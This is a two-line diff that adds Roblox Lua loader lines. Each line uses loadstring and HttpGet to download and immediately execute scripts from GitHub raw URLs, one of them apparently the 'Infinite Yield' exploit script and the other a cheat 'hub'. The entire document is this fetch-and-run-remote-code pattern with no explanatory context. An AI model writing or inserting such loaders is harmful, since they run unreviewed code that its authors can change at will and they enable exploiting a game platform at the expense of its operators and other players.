@@ -1,0 +1,2 @@
+﻿loadstring(game:HttpGet("https://raw.githubusercontent.com/leoo-py/euroqian-hub/refs/heads/main/valindrasfortitude.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
